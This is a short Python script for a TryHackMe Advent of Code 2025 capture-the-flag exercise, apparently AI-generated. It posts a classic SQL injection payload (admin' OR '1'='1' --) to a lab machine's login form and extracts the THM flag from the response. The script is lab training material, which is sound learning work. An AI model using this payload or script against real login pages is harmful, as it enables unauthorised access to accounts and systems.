import requests

# === TryHackMe AoC 2025 Day 4 - AI-Generated SQLi Exploit Example ===
# Replace with your target machine IP (e.g., from the deployed vulnerable app)
TARGET_URL = "http://MACHINE_IP:5000"

# Basic SQL injection payload to bypass authentication (classic ' OR 1=1 --)
payload = {
    "username": "admin' OR '1'='1' -- ",
    "password": ""
}

# Optional: Custom headers to mimic a real browser
headers = {
    "User-Agent": "Mozilla/5.0 (compatible; AI-RedTeam-Agent/1.0)"
}

print("[*] Sending exploit payload...")
response = requests.post(TARGET_URL, data=payload, headers=headers)

if response.status_code == 200:
    print("[+] Login bypassed successfully!")
    # The flag is usually printed in the response or on the redirected page
    if "THM{" in response.text:
        flag_start = response.text.find("THM{")
        flag_end = response.text.find("}", flag_start) + 1
        print(f"[!] Flag found: {response.text[flag_start:flag_end]}")
    else:
        print("[i] Check response manually for the flag.")
        print(response.text[:500])
else:
    print(f"[-] Failed: {response.status_code}")
